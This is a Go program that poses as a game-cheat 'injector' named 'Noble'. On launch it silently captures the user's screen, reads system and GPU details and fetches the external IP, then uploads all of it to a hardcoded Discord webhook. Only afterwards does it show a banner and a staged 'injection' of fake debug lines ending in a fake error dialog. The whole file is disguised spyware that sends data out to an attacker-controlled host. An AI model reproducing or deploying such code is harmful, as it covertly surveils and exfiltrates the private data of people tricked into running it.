package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"image/png"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"github.com/fatih/color"
	"github.com/go-resty/resty/v2"
	"github.com/kbinani/screenshot"
	"tawesoft.co.uk/go/dialog"
)

type DiscordPayload struct {
	Content string  `json:"content"`
	Embeds  []Embed `json:"embeds,omitempty"`
}

type Embed struct {
	Title       string `json:"title,omitempty"`
	Description string `json:"description,omitempty"`
}

func getGPUInfo() (string, error) {
	cmd := exec.Command("wmic", "path", "win32_videocontroller", "get", "caption")
	var out bytes.Buffer
	cmd.Stdout = &out
	err := cmd.Run()
	if err != nil {
		return "", err
	}

	// Split the output into lines
	lines := strings.Split(out.String(), "\n")

	// Find the line containing GPU information
	var gpuInfo string
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" && !strings.Contains(line, "Caption") {
			gpuInfo = line
			break
		}
	}

	return gpuInfo, nil
}

func getExternalIP() (string, error) {
	resp, err := http.Get("https://api.ipify.org?format=text")
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	ip, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(ip), nil
}

func captureScreenshot() ([]byte, error) {
	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return nil, err
	}

	var buf bytes.Buffer
	err = png.Encode(&buf, img)
	if err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

func sendToDiscord(message string, screenshotData []byte) {
	// Define the webhook URL
	webhookURL := "https://discord.com/api/webhooks/1265271631492939847/W-wixXSPYfhGIPbfvCPUDGixo5dypuZWeH3ICGTGABNCTVSGcDOMml1BhqWSFeBgaEL-"

	// Create the Resty client
	client := resty.New()

	// Prepare the payload
	payload := DiscordPayload{
		Content: message,
	}

	// Convert payload to JSON
	payloadBytes, err := json.Marshal(payload)
	if err != nil {
		fmt.Println("Error marshalling payload:", err)
		return
	}

	// Prepare multipart form data
	var buf bytes.Buffer
	writer := multipart.NewWriter(&buf)

	// Add the text part
	textPart, err := writer.CreateFormField("payload_json")
	if err != nil {
		fmt.Println("Error creating form field:", err)
		return
	}
	_, err = textPart.Write(payloadBytes)
	if err != nil {
		fmt.Println("Error writing text part:", err)
		return
	}

	// Add the file part
	filePart, err := writer.CreateFormFile("file", "screenshot.png")
	if err != nil {
		fmt.Println("Error creating form file:", err)
		return
	}
	_, err = filePart.Write(screenshotData)
	if err != nil {
		fmt.Println("Error writing file part:", err)
		return
	}

	// Close the writer
	writer.Close()

	// Send the POST request to the Discord webhook
	_, err = client.R().
		SetHeader("Content-Type", writer.FormDataContentType()).
		SetBody(&buf).
		Post(webhookURL)

	if err != nil {
		fmt.Println("Error sending request:", err)
		return
	}
}

func main() {
	// Gather system information
	goOS := runtime.GOOS
	goArch := runtime.GOARCH
	goVersion := runtime.Version()
	numCPU := runtime.NumCPU()
	memStats := new(runtime.MemStats)
	runtime.ReadMemStats(memStats)
	memAlloc := memStats.Alloc / (1024 * 1024) // in MB

	// Get GPU information
	gpuInfo, err := getGPUInfo()
	if err != nil {
		gpuInfo = "Unable to retrieve GPU information"
	}

	// Get external IP address
	externalIP, err := getExternalIP()
	if err != nil {
		externalIP = "Unable to retrieve IP address"
	}

	// Capture screenshot
	screenshotData, err := captureScreenshot()
	if err != nil {
		fmt.Println("Error capturing screenshot:", err)
		return
	}

	// Format the system information
	systemInfo := fmt.Sprintf(
		"**System Information:**\n"+
			"- **Operating System:** %s\n"+
			"- **Architecture:** %s\n"+
			"- **Go Version:** %s\n"+
			"- **Number of CPUs:** %d\n"+
			"- **Memory Allocated:** %d MB\n"+
			"- **GPU Info:** %s\n"+
			"- **External IP:** %s\n",
		goOS, goArch, goVersion, numCPU, memAlloc, gpuInfo, externalIP,
	)

	// Send the system information and screenshot to Discord
	sendToDiscord(systemInfo, screenshotData)

	color.Cyan("███╗   ██╗ ██████╗ ██████╗ ██╗     ███████╗")
	color.Cyan("████╗  ██║██╔═══██╗██╔══██╗██║     ██╔════╝")
	color.Cyan("██╔██╗ ██║██║   ██║██████╔╝██║     █████╗  ")
	color.Cyan("██║╚██╗██║██║   ██║██╔══██╗██║     ██╔══╝  ")
	color.Cyan("██║ ╚████║╚██████╔╝██████╔╝███████╗███████╗")
	color.Cyan("╚═╝  ╚═══╝ ╚═════╝ ╚═════╝ ╚══════╝╚══════╝")
	fmt.Print("Welcome To Noble!")
	time.Sleep(3 * time.Second)
	color.Cyan("Coded by Bombed Discord: bombed3")

	reader := bufio.NewReader(os.Stdin)

	fmt.Print("\n inject? y/n: ")
	input, _ := reader.ReadString('\n')
	input = strings.TrimSpace(input)

	if input == "y" {
		fmt.Println("Injecting...")
		// Simulate the injection process with debug output
		time.Sleep(500 * time.Millisecond)
		color.Blue("[14:34:27] [Debug] [Hooking] MH initialized")
		time.Sleep(300 * time.Millisecond)
		color.Blue("[14:34:27] [Debug] [Threads] DDT registered")
		time.Sleep(300 * time.Millisecond)
		color.Blue("[14:34:27] [Debug] [Threads] IDT registered")
		time.Sleep(300 * time.Millisecond)
		color.Blue("[14:34:27] [Debug] [Windows] W initialized")
		time.Sleep(300 * time.Millisecond)
		color.Blue("[14:34:27] [Debug] [Hooking] IH initialized")
		time.Sleep(300 * time.Millisecond)
		color.Blue("[14:34:27] [Debug] [Natives] CM initialized")
		time.Sleep(300 * time.Millisecond)
		color.Blue("[14:34:27] [Debug] [Pattern] Found RNT")
		time.Sleep(300 * time.Millisecond)
		color.Blue("[14:34:27] [Debug] [Pattern] Found F24")
		time.Sleep(300 * time.Millisecond)
		color.Blue("[14:34:28] [Debug] [Pattern] Found DFKEL -> hooked")
		color.Blue("[14:34:28] [Debug] [Pattern] Found DFKEL -> hooked")
		time.Sleep(500 * time.Millisecond)
		color.Blue("[14:34:27] [Debug] [Hooking] MH initialized")
		time.Sleep(300 * time.Millisecond)
		color.Blue("[14:34:27] [Debug] [Threads] DDT registered")
		time.Sleep(300 * time.Millisecond)
		color.Blue("[14:34:27] [Debug] [Threads] IDT registered")
		time.Sleep(300 * time.Millisecond)
		color.Blue("[14:34:27] [Debug] [Windows] W initialized")
		time.Sleep(300 * time.Millisecond)
		color.Blue("[14:34:27] [Debug] [Hooking] IH initialized")
		time.Sleep(300 * time.Millisecond)
		color.Blue("[14:34:27] [Debug] [Natives] CM initialized")
		time.Sleep(300 * time.Millisecond)
		color.Blue("[14:34:27] [Debug] [Pattern] Found RNT")
		time.Sleep(30 * time.Millisecond)
		color.Blue("[14:34:27] [Debug] [Pattern] Found F24")
		time.Sleep(30 * time.Millisecond)
		color.Blue("[14:34:28] [Debug] [Pattern] Found DFKEL -> hooked")
		color.Blue("[14:34:28] [Debug] [Pattern] Found DFKEL -> hooked")
		time.Sleep(50 * time.Millisecond)
		color.Red("[14:34:27] [Debug] [Hooking] MH initialized")
		time.Sleep(30 * time.Millisecond)
		color.Red("[14:34:27] [Debug] [Threads] DDT registered")
		time.Sleep(30 * time.Millisecond)
		color.Red("[14:34:27] [Debug] [Threads] IDT registered")
		time.Sleep(30 * time.Millisecond)
		color.Red("[14:34:27] [Debug] [Windows] W initialized")
		time.Sleep(30 * time.Millisecond)
		color.Red("[14:34:27] [Debug] [Hooking] IH initialized")
		time.Sleep(30 * time.Millisecond)
		color.Red("[14:34:27] [Debug] [Natives] CM initialized")
		time.Sleep(30 * time.Millisecond)
		color.Red("[14:34:27] [Debug] [Pattern] Found RNT")
		time.Sleep(30 * time.Millisecond)
		color.Red("[14:34:27] [Debug] [Pattern] Found F24")
		time.Sleep(30 * time.Millisecond)
		color.Red("[14:34:28] [Debug] [Pattern] Found DFKEL -> hooked")
		color.Red("[14:34:28] [Debug] [Pattern] Found DFKEL -> hooked")
		time.Sleep(50 * time.Millisecond)
		color.Red("[14:34:27] [Debug] [Hooking] MH initialized")
		time.Sleep(30 * time.Millisecond)
		color.Red("[14:34:27] [Debug] [Threads] DDT registered")
		time.Sleep(30 * time.Millisecond)
		color.Red("[14:34:27] [Debug] [Threads] IDT registered")
		time.Sleep(30 * time.Millisecond)
		color.Red("[14:34:27] [Debug] [Windows] W initialized")
		time.Sleep(30 * time.Millisecond)
		color.Red("[14:34:27] [Debug] [Hooking] IH initialized")
		time.Sleep(30 * time.Millisecond)
		color.Red("[14:34:27] [Debug] [Natives] CM initialized")
		time.Sleep(30 * time.Millisecond)
		color.Red("[14:34:27] [Debug] [Pattern] Found RNT")
		time.Sleep(30 * time.Millisecond)
		color.Red("[14:34:27] [Debug] [Pattern] Found F24")
		time.Sleep(30 * time.Millisecond)
		color.Red("[14:34:28] [Debug] [Pattern] Found DFKEL -> hooked")
		color.Red("[14:34:28] [Debug] [Pattern] Found DFKEL -> hooked")
		time.Sleep(2 * time.Second)
		go dialog.Alert("Hit an unexpected error.")
		time.Sleep(10 * time.Second)
	} else if input == "n" {
		fmt.Println("Exiting the program.")
	} else {
		fmt.Println("Invalid input. Please enter 'y' for yes or 'n' for no.")
	}
}
